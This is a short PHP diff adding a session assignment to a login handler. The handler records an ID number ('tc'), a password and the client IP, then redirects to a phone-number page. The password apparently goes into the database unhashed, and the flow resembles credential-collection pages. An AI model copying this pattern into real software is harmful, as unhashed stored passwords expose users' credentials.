@@ -58,6 +58,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $insert->execute([$tc, $password, time() + 10, IP]);
         }
 
+        $_SESSION['user_tc'] = $tc;
+
         // Route to telefon.php
         $ajax->redirect('telefon.php');
     } else {
